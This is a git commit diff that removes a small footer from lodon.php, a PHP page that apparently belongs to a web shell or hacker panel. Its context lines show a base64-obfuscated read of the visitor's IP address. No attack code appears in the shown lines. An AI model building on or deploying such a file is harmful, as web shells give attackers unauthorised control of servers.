4f2c99ccf4b5fb18a61410b2096ea2aad37c7dbb
kinglodon <almightyzoroo@gmail.com>
2024-05-27 10:17:14 +0700

    Update lodon.php

--- lodon.php
+++ lodon.php
@@ -423,9 +423,6 @@ button, input:hover {
 <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
 </head>
 <body>
-<div class="footer text-light">
-  <p>Yowaii Mo 🤡</p>
-</div>
 <div class="table-responsive text-light separator" style="text-align: left;padding: 12px 12px 4px;border: 2px solid #4200ac;border-radius:5px;">
     <div class="separate-table">
         <li>Your IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
